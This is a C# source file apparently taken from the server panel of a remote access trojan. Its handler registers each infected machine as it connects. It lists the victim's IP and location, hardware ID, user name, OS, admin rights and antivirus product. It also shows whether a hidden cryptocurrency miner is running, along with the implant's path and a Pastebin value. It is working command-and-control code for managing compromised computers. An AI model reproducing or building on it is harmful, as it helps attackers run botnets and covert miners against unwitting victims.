﻿using System;
using Server.MessagePack;
using Server.Connection;
using cGeoIp;
using System.Drawing;
using System.Windows.Forms;

namespace Server.Handle_Packet
{
    public class HandleListView
    {
        public void AddToListview(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                try
                {
                    client.CheckPlugin();
                }
                catch { }

                client.LV = new ListViewItem();
                client.LV.Tag = client;
                client.LV.Text = string.Format("{0}:{1}", client.TcpClient.RemoteEndPoint.ToString().Split(':')[0], client.TcpClient.LocalEndPoint.ToString().Split(':')[1]);
                string[] ipinf;
                try
                {
                    ipinf = new cGeoMain().GetIpInf(client.TcpClient.RemoteEndPoint.ToString().Split(':')[0]).Split(':');
                }
                catch { ipinf = new string[] { "?", "?" }; }
                client.LV.SubItems.Add(ipinf[1]);
                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("HWID").AsString);
                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("User").AsString);
                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("OS").AsString);
                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Version").AsString);
                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Admin").AsString);
                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Antivirus").AsString);
                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Performance").AsString.Replace("MINER 0", "MINER Offline").Replace("MINER 1", "MINER Online"));
                client.LV.ToolTipText = "[Path] " + unpack_msgpack.ForcePathObject("Path").AsString + Environment.NewLine;
                client.LV.ToolTipText += "[Pastebin] " + unpack_msgpack.ForcePathObject("Pastebin").AsString;
                client.ID = unpack_msgpack.ForcePathObject("HWID").AsString;

                lock (Settings.LockListviewClients)
                {
                    Program.form1.listView1.Items.Add(client.LV);
                    Program.form1.listView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
                }

                if (Properties.Settings.Default.Notification == true)
                {
                    Program.form1.notifyIcon1.BalloonTipText = $@"Connected 
{client.TcpClient.RemoteEndPoint.ToString().Split(':')[0]} : {client.TcpClient.LocalEndPoint.ToString().Split(':')[1]}";
                    Program.form1.notifyIcon1.ShowBalloonTip(100);
                }

                new HandleLogs().Addmsg($"Client {client.TcpClient.RemoteEndPoint.ToString().Split(':')[0]} connected", Color.Green);
            }
            catch { }
        }

        public void Received(Clients client)
        {
            try
            {
                lock (Settings.LockListviewClients)
                    if (client.LV != null)
                        client.LV.ForeColor = Color.Empty;
            }
            catch { }
        }
    }
}
